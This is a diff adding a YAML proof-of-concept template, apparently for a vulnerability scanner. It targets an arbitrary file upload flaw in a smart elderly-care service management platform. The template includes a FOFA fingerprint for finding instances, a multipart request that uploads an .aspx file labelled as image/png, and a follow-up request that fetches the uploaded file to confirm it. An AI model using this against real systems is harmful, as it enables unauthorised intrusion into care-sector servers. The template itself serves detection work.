@@ -1,0 +1,34 @@
+id: poc-yaml-shecismp-infoupload-anyfile-upload
+info:
+  name: 智慧医养综合服务管理平台 InfoUpload 任意文件上传漏洞
+  severity: critical
+  tags:
+  - 文件上传
+  finger: 智慧医养综合服务管理平台
+  fofa: body="Content/css/Login/images/gtx-main-bg00004.png" || body="KingonUI.CommItemInfo()"
+variables:
+  t1: random_str(7)
+  t2: base64(t1)
+  dt: concat(datetime("2006"),datetime("01"),datetime("02"))
+requests:
+- method: POST
+  path: /WebData/InfoUpload
+  headers:
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryFfJZ4PlAZBixjELj
+  data: '------WebKitFormBoundaryFfJZ4PlAZBixjELj
+
+    Content-Disposition: form-data; name="file"; filename="{{.t1}}.aspx"
+
+    Content-Type: image/png
+
+
+    {{.t2}}
+
+    ------WebKitFormBoundaryFfJZ4PlAZBixjELj--'
+  expression: status_code == 200 && contains(body,"上传成功") && contains(body,".aspx")
+  output:
+  - regex_match(body,"/(?P<file>[0-9a-z_]+).aspx")
+- method: GET
+  path: /UpLoadUserExcel/{{.dt}}/{{.file}}.aspx
+  expression: status_code == 200 && body == t2
+transport: http
